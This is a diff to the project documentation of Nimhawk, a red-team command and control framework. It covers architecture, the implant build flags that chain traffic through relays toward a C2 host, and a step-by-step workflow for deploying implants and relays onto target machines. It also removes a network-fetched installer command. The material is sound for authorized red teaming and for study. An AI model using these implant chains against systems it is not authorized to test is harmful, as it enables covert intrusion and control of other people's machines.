@@ -2,315 +2,250 @@
 
 ## Overview
 
-Nimhawk is a command and control (C2) framework designed for educational and authorized red teaming purposes. It consists of:
-
-- **Python backend server** - Handles implant communications and operator management
-- **React/Next.js frontend** - Web-based operator interface
-- **Nim-based implants** - Lightweight agents that run on target systems
-- **SQLite database** - Stores implant data, commands, and session information
-
-The system uses a client-server architecture where operators interact with implants through a web interface, sending commands and receiving results via HTTP/HTTPS channels.
+Nimhawk is a command and control (C2) framework designed for educational and authorized red teaming. It comprises a Python backend server, a React/Next.js frontend for operator interaction, Nim-based implants for target systems, and an SQLite database for data storage. The framework utilizes a client-server architecture with HTTP/HTTPS for communication, enabling operators to manage implants via a web interface.
 
 ## User Preferences
 
 Preferred communication style: Simple, everyday language.
 
-## Quick Setup
-
-### Automated Setup (Recommended)
-
-Run the automated setup script to configure the entire environment:
-
-```bash
-chmod +x setup.sh
-./setup.sh
-```
-
-This script will:
-- Detect if running in Replit or local environment
-- Install Nim compiler (2.2.4+) and Nimble package manager
-- Install Python dependencies from server/requirements.txt
-- Install Nim dependencies (nimcrypto, parsetoml, puppy)
-- Create config.toml from template if needed
-- Configure Replit-specific settings (domain, ports)
-- Create necessary directories for logs, downloads, uploads
-
-### Manual Setup (Replit)
-
-If you prefer manual setup in Replit:
-
-1. **Python dependencies** are auto-installed via the python-3.11 module
-2. **Nim installation**: Run `curl https://nim-lang.org/choosenim/init.sh -sSf | sh -s -- -y`
-3. **Add Nim to PATH**: `export PATH="$HOME/.nimble/bin:$PATH"`
-4. **Install Nim packages**: `nimble install -y nimcrypto parsetoml puppy`
-5. **Update config.toml**: Set `port = 5000` and `implantCallbackIp` to your Replit domain
-
-### Docker Setup
-
-Build and run with Docker:
-
-```bash
-docker build -t nimhawk .
-docker run -p 5000:5000 -p 8080:8080 nimhawk server
-```
-
-### Replit-Specific Configuration
-
-Current Replit environment is configured with:
-- **Admin API**: Port 5000 (public HTTPS on port 443)
-- **Implants Server**: Port 8080 (internal, proxied through Admin API)
-- **Domain**: Auto-detected and configured in config.toml
-- **Workflow**: Backend automatically starts via `.replit` configuration
-
 ## System Architecture
 
 ### Backend Architecture
 
-**Technology Stack:**
-- Python 3.8+ with Flask for REST API
-- SQLite database (via APSW) for data persistence
-- Gevent for async request handling
-- XOR and AES-CTR encryption for secure communications
-
-**Core Components:**
-1. **Admin API Server** (`server/src/servers/admin_api/`) - Serves the web UI and handles operator authentication/commands on port 5000 (Replit) or 9669 (local)
-2. **Implants Server** (`server/src/servers/implants_api/`) - Listens for implant callbacks on configurable ports (8080 internal, proxied through port 5000 in Replit)
-3. **Database Layer** (`server/src/config/db.py`) - SQLite schema with tables for implants, commands, tasks, downloads, workspaces, and users
-
-**Design Decisions:**
-- Single SQLite database file (`nimhawk.db`) for simplicity and portability
-- XOR encryption with unique keys per implant for obfuscation
-- Session-based authentication with JWT tokens stored in localStorage
-- TOML configuration file (`config.toml`) as single source of truth for server settings
+The backend is built with Python 3.8+ and Flask, using Gevent for asynchronous handling and SQLite (via APSW) for data persistence. Communication is secured with XOR and AES-CTR encryption. It includes an Admin API for the web UI and operator commands, and an Implants Server for implant callbacks. A single `nimhawk.db` file simplifies data management, and configuration is handled via `config.toml`.
 
 ### Frontend Architecture
 
-**Technology Stack:**
-- Next.js 15.x with React 18
-- Mantine UI component library v7
-- SWR for data fetching and caching
-- Electron wrapper for desktop application
-
-**Core Design Patterns:**
-1. **Static Site Generation** - Next.js exports static files to `out/` directory for production
-2. **API Communication** - Centralized API layer (`modules/apiFetcher.ts`) with axios interceptors for auth
-3. **Real-time Updates** - SWR polling (10s intervals) for implant status and console data
-4. **Component Architecture** - Modular components for reusability (Console, NimplantDrawer, FilePreview, etc.)
-
-**Key Files:**
-- `config.ts` - Environment-based server URL configuration
-- `modules/nimplant.ts` - Core API endpoints and data fetching logic
-- `version.ts` - Centralized version management reading from package.json
+The frontend uses Next.js 15.x with React 18, Mantine UI v7, and SWR for data fetching. It follows a static site generation approach, uses a centralized API layer with Axios, and provides real-time updates through SWR polling. It can be wrapped in Electron for a desktop application.
 
 ### Authentication & Authorization
 
-**Mechanism:**
-- JWT bearer tokens for session management
-- Tokens stored in browser localStorage
-- Authorization header (`Bearer <token>`) on all authenticated requests
-- Default credentials configured in `config.toml` under `[[auth.users]]`
-
-**Security Considerations:**
-- CORS enabled for cross-origin requests
-- Credentials included in requests (`withCredentials: true`)
-- Token verification on each protected API endpoint
+Nimhawk uses JWT bearer tokens stored in browser localStorage for session management and authorization. Tokens are verified on all protected API endpoints. Default credentials are set in `config.toml`.
 
 ### Database Schema
 
-**Primary Tables:**
-- `nimplants` - Implant metadata (GUID, hostname, IP, process info, check-in times)
-- `tasks` - Commands queued for implants
-- `console` - Command execution history and results
-- `downloads` - Files retrieved from implants
-- `file_transfers` - Audit log of all file operations
-- `workspaces` - Logical groupings of implants for multi-tenancy
-- `users` - Operator authentication credentials (bcrypt hashed passwords)
-
-**Relationships:**
-- Implants belong to workspaces (1:many)
-- Tasks reference implants via GUID (many:1)
-- Downloads link to implants for file tracking
+Key tables include `nimplants` (implant metadata), `tasks` (queued commands), `console` (command history), `downloads` (files retrieved), `file_transfers` (audit log), `workspaces` (implant grouping), `users` (operator credentials), and `chain_relationships` (relay topology).
 
 ### Communication Protocol
 
-**Implant → Server Flow:**
-1. Initial registration with XOR-encrypted metadata
-2. Periodic check-ins for pending tasks (pull model)
-3. Task result submission with encrypted payloads
-4. File upload/download via dedicated endpoints
+Implants register and periodically check in with the server for tasks, submitting results with encrypted payloads. Operators interact via authenticated REST API requests, queuing commands for implants, and receiving results via SWR polling. Encryption layers include an initial XOR key, unique per-implant XOR keys, and optional AES-CTR.
 
-**Operator → Server Flow:**
-1. Web UI sends authenticated REST API requests
-2. Server validates JWT and processes commands
-3. Commands queued in database for next implant check-in
-4. Results streamed back to UI via SWR polling
+### HTTP Relay System
 
-**Encryption Layers:**
-- Initial XOR key from `.xorkey` file for registration
-- Per-implant unique XOR key for session isolation
-- Optional AES-CTR for payload encryption (SOR crypto module)
-
-### HTTP Relay System (New Architecture)
-
-**Overview:**  
-Simple HTTP-over-HTTP relay system for multi-hop agent chains. Relays blindly forward HTTP requests without decrypting the end-to-end encrypted payload between final agents and C2.
+Nimhawk features a pure HTTP-over-HTTP relay system for N-level agent chains, where relays blindly forward HTTP requests without decrypting end-to-end encrypted payloads between agents and the C2.
 
 **Design Principles:**
-1. **Separation of Concerns**: Routing (X-Next-Hop) vs Topology (X-Relay-GUID and /chain endpoint)
-2. **Minimal Relay Intelligence**: Relays only decrypt routing headers, not agent payloads
-3. **End-to-End Encryption**: Only C2 and final agent share encryption keys
-4. **Multi-Hop Support**: Chains of arbitrary depth (Agent → Relay1 → Relay2 → ... → C2)
+- **Single RELAY_CHAIN Define**: Unifies target selection and X-Next-Hop header injection.
+- **Minimal Relay Intelligence**: Relays decrypt only routing headers, not agent payloads.
+- **End-to-End Encryption**: Keys are shared only between C2 and the final agent.
+- **Multi-Hop Support**: Supports arbitrary depth relay chains.
+- **Dynamic Relay Start**: Relay servers can be initiated at runtime via operator commands.
 
 **Core Components:**
-
-1. **`multi_implant/core/http_relay.nim`** - HTTP relay server
-   - Listens on configured `RELAY_PORT`
-   - Decrypts `X-Next-Hop` header (XOR + Base64 with INITIAL_XOR_KEY)
-   - Forwards entire HTTP request to next hop
-   - Injects `X-Relay-GUID` header (removes previous to avoid duplicates)
-   - Supports multi-hop by stripping/replacing X-Relay-GUID at each hop
-
-2. **`multi_implant/core/webClientListener.nim`** - Agent HTTP client
-   - Injects `X-Next-Hop` header when `RELAY_CHAIN` is defined at compile time
-   - Header contains encrypted address of next hop (format: "host:port")
-   - Sends all HTTP requests through relay chain transparently
-
-3. **`server/src/servers/implants_api/implants_server_init.py`** - C2 endpoint
-   - Reads `X-Relay-GUID` header during agent registration
-   - Decrypts relay GUID (XOR + Base64 with xor_key)
-   - Stores parent-child relationship in `chain_relationships` table
-   - Supports direct C2 connections (no X-Relay-GUID) and relayed connections
-
-**Compilation Variables:**
-
-- **`RELAY_CHAIN`** (string): Comma-separated list of relay hops ending with C2
-  Single hop: `RELAY_CHAIN=relay1.com:8080,c2-server.com:5000`  
-  Multi-hop: `RELAY_CHAIN=relay1.com:8080,relay2.com:8080,c2-server.com:5000`  
-  **Critical behavior:**
-  - Agent connects to FIRST hop (relay1.com:8080) as target URL
-  - X-Next-Hop header contains FULL chain (all relays + C2)
-  - ALL traffic is proxied through relay chain, NEVER direct to C2
-  - Each relay consumes first hop and forwards to next
-
-- **`RELAY_PORT`** (int): Port to listen on as relay server  
-  Example: `RELAY_PORT=8080`  
-  Starts HTTP relay server ONLY if this is defined
-  Server initializes AFTER successful C2 registration with real implant GUID
-
-**Build Examples:**
-
-```bash
-# Agent that forwards through single relay to C2
-# - Connects to relay1.com:8080 (first hop)
-# - X-Next-Hop: "relay1.com:8080,c2-server.com:5000"
-# - Relay1 forwards to c2-server.com:5000
-make darwin_arm64 RELAY_CHAIN=relay1.com:8080,c2-server.com:5000 DEBUG=1
-
-# Agent that forwards through 2 relays to C2 (3-hop chain)
-# - Connects to relay1.com:8080 (first hop)
-# - X-Next-Hop: "relay1.com:8080,relay2.com:8080,c2-server.com:5000"
-# - Relay1 → Relay2 → C2
-make darwin_arm64 RELAY_CHAIN=relay1.com:8080,relay2.com:8080,c2-server.com:5000 DEBUG=1
-
-# Relay server (listens on 8080, connects directly to C2)
-# - Registers with C2 to get unique GUID
-# - Starts relay server AFTER registration
-# - Forwards incoming requests to C2
-make linux_x64 RELAY_PORT=8080 DEBUG=1
-
-# Multi-hop relay: listens on 8080 AND forwards through another relay
-# - Connects to relay2.com:8080 (first hop)
-# - Starts relay server on 8080 AFTER registration
-# - Chain: Agent → This relay (8080) → Relay2 → C2
-make linux_x64 RELAY_CHAIN=relay2.com:8080,c2-server.com:5000 RELAY_PORT=8080 DEBUG=1
-```
-
-**HTTP Headers:**
-
-1. **`X-Next-Hop`** (Routing Layer)
-   - Contains: Encrypted comma-separated list of hops (format: "host1:port1,host2:port2,...")
-   - Encryption: Base64(XOR(hop_chain, INITIAL_XOR_KEY))
-   - Usage: Agent injects full chain, each relay pops first hop and re-encrypts remainder
-   - Scope: Consumed and updated at each hop (remaining chain forwarded)
-   - Last hop: Final relay before C2 omits X-Next-Hop header entirely
-
-2. **`X-Relay-GUID`** (Topology Layer)
-   - Contains: Encrypted GUID of the relay server
-   - Encryption: Base64(XOR(guid, INITIAL_XOR_KEY))
-   - Usage: Relay injects its own GUID, stripping previous relay's GUID
-   - Scope: Reaches C2 to establish parent-child relationship
-   - Critical: Each relay MUST strip existing X-Relay-GUID before injecting its own
-
-**Multi-Hop Example Flow (3-hop chain):**
-
-1. **Agent** sends request with `X-Next-Hop: enc("relay1:8080,relay2:8080,c2:5000")`
-2. **Relay1** decrypts → pops "relay1:8080" → forwards to relay1:8080 with `X-Next-Hop: enc("relay2:8080,c2:5000")` + `X-Relay-GUID: enc(relay1_guid)`
-3. **Relay2** decrypts → pops "relay2:8080" → forwards to relay2:8080 with `X-Next-Hop: enc("c2:5000")` + `X-Relay-GUID: enc(relay2_guid)` (strips relay1's GUID)
-4. **C2** receives request with `X-Relay-GUID: enc(relay2_guid)` → stores agent's parent as relay2
-
-**Topology Visualization:**
-
-- UI endpoint: `/api/chain-relationships` queries `chain_relationships` table
-- Database stores: (child_guid, parent_guid, role, listening_port)
-- React Flow component renders hierarchical tree in `pages/topology.tsx`
-- Supports nested chains of arbitrary depth (tested up to 10 hops)
-
-**Security Considerations:**
-
-- INITIAL_XOR_KEY is shared across all components (not per-implant)
-- X-Next-Hop and X-Relay-GUID use weak obfuscation (XOR + Base64)
-- Relays can see plaintext addresses of next hops
-- End-to-end payload encryption (AES-CTR) protects agent commands/results
-- No authentication between relay hops (C2 validates with unique agent keys)
+- `multi_implant/core/http_relay.nim`: HTTP relay server.
+- `multi_implant/core/webClientListener.nim`: Agent HTTP client, which always connects to the first hop in `RELAY_CHAIN`.
+- `multi_implant/core/relay_launcher.nim`: Asynchronously starts the relay server.
+- `multi_implant/core/cmdParser.nim`: Detects and parses `relay <PORT>` commands.
+- `multi_implant/main.nim`: Orchestrates implant operations and dynamically launches the relay server.
+- `server/src/servers/implants_api/implants_server_init.py`: C2 endpoint that reads `X-Relay-GUID` to establish `chain_relationships`.
 
 ### Multi-Platform Support
 
-**Implant Compilation:**
-- Primary target: Windows x64 (Nim compiled)
-- Multi-platform support via `multi_implant/` directory (Linux x64/ARM/MIPS, macOS)
-- Cross-compilation using MinGW-w64 (Linux → Windows)
-- Build system uses `nimble` and custom Python builder script
-
-**Desktop Application:**
-- Electron wrapper for standalone deployment
-- Scripts: `electron-dev`, `electron-build` for packaging
-- Platform targets: macOS, Windows, Linux via electron-builder
+Implants support Windows x64, macOS (ARM64, x64), and Linux (x64, ARM, ARM64, MIPS), with cross-compilation capabilities. The frontend can be packaged for macOS, Windows, and Linux using Electron.
 
 ## External Dependencies
 
 ### Backend Services
-- **Flask** (3.0.3) - Web framework for REST API
-- **Gevent** (24.2.1) - WSGI server with async capabilities
-- **Cryptography** (43.0.0) - Modern crypto primitives
-- **PyCryptoDome** (3.20.0) - AES encryption implementation
-- **APSW** (3.49.1.0) - Advanced SQLite wrapper
-- **TOML** (0.10.2) - Configuration file parsing
+- **Flask**: Web framework
+- **Gevent**: WSGI server
+- **Cryptography**: Crypto primitives
+- **PyCryptoDome**: AES encryption
+- **APSW**: SQLite wrapper
+- **TOML**: Configuration parsing
 
 ### Frontend Services
-- **Next.js** (15.2.5) - React framework with SSG
-- **Mantine** (7.11.2) - UI component library
-- **Axios** (1.8.4) - HTTP client with interceptors
-- **SWR** (2.2.5) - Data fetching and caching
-- **React Flow** (11.11.4) - Network topology visualization
-- **Electron** (32.2.0) - Desktop application packaging
+- **Next.js**: React framework
+- **Mantine**: UI component library
+- **Axios**: HTTP client
+- **SWR**: Data fetching and caching
+- **React Flow**: Network topology visualization
+- **Electron**: Desktop application packaging
 
 ### Build Tools
-- **Nim** (2.2.4+) - Implant compilation language
-- **Nimble** (0.18.2+) - Nim package manager
-- **MinGW-w64** - Cross-compilation toolchain (for Windows targets)
-- **Node.js 16+** - Frontend build tooling
-- **Python 3.11** - Backend runtime (configured for Replit)
+- **Nim**: Implant compilation
+- **Nimble**: Nim package manager
+- **MinGW-w64**: Cross-compilation
+- **Node.js**: Frontend build tooling
+- **Python 3.11**: Backend runtime
+- **Zig**: Cross-platform C compiler wrapper
+## HTTP Relay System - Detailed Documentation
 
-### Development Tools
-- **Docker** - Containerized deployment option
-- **electron-builder** (25.1.8) - Desktop app packaging
-- **TypeScript** (5.5.4) - Type safety for frontend
-- **ESLint** - Code quality enforcement
+### Recent Changes (September 30, 2025)
+- **Removed**: ~1500 lines of legacy relay protocol code from multi_implant/main.nim
+- **Unified**: RELAY_CHAIN define now controls both target selection and X-Next-Hop header injection
+- **Deprecated**: RELAY_CHAIN_TARGET removed (use RELAY_CHAIN only)
+- **Simplified**: httpHandler uses only HTTP relay system (no dual-mode logic)
+- **Verified**: Successful compilation of Darwin ARM64 binary (99827 lines)
 
-### Configuration Files
-- `config.toml` - Server settings (IP, ports, paths, auth)
-- `.xorkey` - Initial encryption key (generated on first run)
-- `package.json` - Single source of truth for version (1.4.0)
-- `nimhawk.db` - SQLite database file (auto-created)
-- `setup.sh` - Automated environment setup script for Replit/Docker/local
-- `.replit` - Replit-specific configuration (workflows, modules, ports)
+### Multi-Hop Behavior Example (3-Hop Chain)
+
+**Scenario**: Agent → Relay1 → Relay2 → C2
+
+**Step 1: Agent sends request**
+- Target URL: `http://relay1.com:8080/register`
+- X-Next-Hop: `<encrypted:"relay1.com:8080,relay2.com:8080,c2.com:5000">`
+- X-Relay-GUID: None (not a relay)
+- Payload: Encrypted with XOR+AES (only C2 can decrypt)
+
+**Step 2: Relay1 receives and forwards**
+- Decrypts X-Next-Hop → "relay1.com:8080,relay2.com:8080,c2.com:5000"
+- Pops first hop (itself) → remainder: "relay2.com:8080,c2.com:5000"
+- Re-encrypts remainder → new X-Next-Hop
+- Forwards to: `http://relay2.com:8080/register`
+- Injects X-Relay-GUID: `<encrypted:relay1_guid>`
+- Payload: Unchanged (still encrypted for C2)
+
+**Step 3: Relay2 receives and forwards**
+- Decrypts X-Next-Hop → "relay2.com:8080,c2.com:5000"
+- Pops first hop (itself) → remainder: "c2.com:5000"
+- Re-encrypts remainder → new X-Next-Hop
+- Forwards to: `http://c2.com:5000/register`
+- Replaces X-Relay-GUID: `<encrypted:relay2_guid>` (strips Relay1's GUID)
+- Payload: Unchanged
+
+**Step 4: C2 receives request**
+- Decrypts agent payload (has matching XOR+AES keys)
+- Reads X-Relay-GUID → identifies immediate parent (relay2)
+- Stores relationship in chain_relationships table
+- Response flows back through same chain in reverse
+
+### Compilation Variables
+
+| Variable | Type | Required | Description | Example |
+|----------|------|----------|-------------|---------|
+| RELAY_CHAIN | string | No | Comma-separated relay hops ending with C2. Controls target URL and X-Next-Hop header. | `relay1.com:8080,c2.com:5000` |
+| RELAY_PORT | int | No | Port for compile-time relay server start | `8080` |
+| DEBUG | int | No | Enable debug logging (0 or 1) | `1` |
+| INITIAL_XOR_KEY | int | Yes | Shared XOR key for header encryption (auto-generated) | `330699173` |
+
+**Note**: RELAY_CHAIN_TARGET was removed. Use RELAY_CHAIN for all relay configuration.
+
+### Build Examples
+
+```bash
+# Standard agent (no relay)
+make darwin_arm64 DEBUG=1
+
+# Single-hop relay (Agent → Relay1 → C2)
+make darwin_arm64 RELAY_CHAIN=relay1.com:8080,c2.com:5000 DEBUG=1
+
+# Two-hop relay (Agent → Relay1 → Relay2 → C2)
+make darwin_arm64 RELAY_CHAIN=relay1.com:8080,relay2.com:8080,c2.com:5000 DEBUG=1
+
+# Hybrid agent (relay client + relay server)
+make darwin_arm64 RELAY_CHAIN=relay1.com:8080,c2.com:5000 RELAY_PORT=8080 DEBUG=1
+
+# Windows build with relay
+make windows_x64 RELAY_CHAIN=relay1.com:8080,c2.com:5000 DEBUG=1
+```
+
+### Operator Workflow for Multi-Hop Deployment
+
+**Objective**: Deploy 3-hop chain (Agent → Relay1 → Relay2 → C2)
+
+1. **Deploy Relay1** (standard agent on Target1)
+   ```bash
+   make darwin_arm64 DEBUG=1
+   # Deploy to Target1, verify registration in Web UI
+   ```
+
+2. **Start Relay1 server** (runtime command)
+   - In Web UI, send command to Relay1: `relay 8080`
+   - Verify console output: "HTTP Relay server started on port 8080"
+
+3. **Deploy Relay2** (relay client on Target2)
+   ```bash
+   make darwin_arm64 RELAY_CHAIN=target1.com:8080,c2.com:5000 DEBUG=1
+   # Deploy to Target2, it will connect through Relay1
+   ```
+
+4. **Start Relay2 server** (runtime command)
+   - In Web UI, send command to Relay2: `relay 8080`
+   - Verify console output: "HTTP Relay server started on port 8080"
+
+5. **Deploy final agent** (relay client on Target3)
+   ```bash
+   make darwin_arm64 RELAY_CHAIN=target2.com:8080,target1.com:8080,c2.com:5000 DEBUG=1
+   # Deploy to Target3, it will connect through Relay2 → Relay1
+   ```
+
+6. **Verify topology**
+   - Check Web UI Network Topology page
+   - Query chain_relationships table in database
+   - Verify X-Relay-GUID headers in debug logs
+
+### Runtime Relay Start (`relay <PORT>` Command)
+
+**Workflow:**
+1. **Operator sends command** via Web UI: `relay 8080`
+2. **cmdParser detects** command in core/cmdParser.nim
+3. **Returns marker**: `RELAY_START:8080`
+4. **main.nim detects** marker at line 1477
+5. **Calls**: `relay_launcher.startRelayServerAsync(listener.id)`
+6. **Server starts** on port 8080 using real implant GUID
+7. **Console output**: "HTTP Relay server started on port 8080"
+
+**Prerequisites:**
+- Agent must be registered with C2 (has valid GUID)
+- Port must be available (not in use)
+- Agent must have network permissions to bind port
+
+**Verification:**
+- Check console output for "HTTP Relay server started"
+- Test connectivity: deploy another agent with RELAY_CHAIN pointing to this relay
+- Verify in Web UI that downstream agent registers through relay
+
+### Topology Verification
+
+**Method 1: Web UI**
+- Navigate to "Network Topology" page
+- Visual representation shows relay chains
+- Hover over nodes to see GUID and parent relationships
+
+**Method 2: Database Query**
+```sql
+SELECT parent_guid, child_guid, relationship_type
+FROM chain_relationships
+ORDER BY created_at DESC;
+```
+
+**Method 3: Debug Logs**
+- Enable DEBUG=1 in build
+- Check console output for:
+  - "Using first relay hop as target: relay1.com:8080"
+  - "Added X-Next-Hop header for relay chain"
+  - "X-Relay-GUID: <encrypted_guid>"
+
+**Method 4: End-to-End Test**
+1. Deploy 2-hop chain (Agent → Relay → C2)
+2. Send command to agent via Web UI: `whoami`
+3. Verify result appears in console
+4. Check debug logs on both agent and relay for header propagation
+
+### Troubleshooting
+
+**Issue**: Agent connects directly to C2 instead of relay
+- **Cause**: RELAY_CHAIN not defined or formatted incorrectly
+- **Solution**: Verify make command includes `RELAY_CHAIN=relay1.com:8080,c2.com:5000`
+
+**Issue**: Relay server fails to start
+- **Cause**: Port already in use or insufficient permissions
+- **Solution**: Try different port or check system permissions
+
+**Issue**: Agent registers but commands don't execute
+- **Cause**: Relay not forwarding X-Next-Hop correctly
+- **Solution**: Enable DEBUG=1 and check logs for header consumption
+
+**Issue**: X-Relay-GUID not appearing in chain_relationships
+- **Cause**: C2 not reading header or encryption mismatch
+- **Solution**: Verify INITIAL_XOR_KEY matches between agent and C2
